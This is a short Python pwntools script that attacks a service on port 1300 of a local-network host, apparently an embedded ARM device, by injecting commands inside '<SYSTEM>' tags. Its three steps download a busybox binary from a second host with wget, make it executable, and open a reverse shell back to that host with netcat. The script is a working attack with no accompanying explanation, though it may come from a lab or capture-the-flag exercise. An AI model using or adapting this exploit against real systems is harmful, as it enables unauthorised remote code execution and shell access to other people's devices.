#! /usr/bin/python
from pwn import *

r = remote('192.168.100.187',1300)
r.sendline('''<SYSTEM>wget http://192.168.100.198/busybox_armv6 -O /tmp/busybox </SYSTEM>''')
r.interactive()
r = remote('192.168.100.187',1300)
r.sendline('''<SYSTEM>chmod +x /tmp/busybox </SYSTEM>''')
r.interactive()
r = remote('192.168.100.187',1300)
r.sendline('''<SYSTEM>/tmp/busybox nc 192.168.100.198 9798 -e /bin/sh </SYSTEM>''')
r.interactive()
